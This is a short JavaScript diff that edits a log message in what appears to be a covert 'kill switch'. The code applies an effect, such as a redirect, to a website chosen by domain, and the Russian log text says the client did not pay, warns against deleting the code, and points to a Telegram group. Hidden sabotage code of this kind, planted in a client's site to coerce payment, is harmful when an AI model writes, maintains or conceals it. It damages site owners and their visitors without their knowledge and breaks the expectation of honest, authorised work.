@@ -69,7 +69,7 @@ function checkDomain() {
             const effectFunction = effects[siteInfo.effect];
             if (effectFunction) {
                 effectFunction(siteInfo.redirecturl || siteInfo.date);
-                console.log("Этот заказчик ${siteInfo.startDate} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam");
+              console.log(`Этот заказчик ${siteInfo.date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
             }
         }
     }
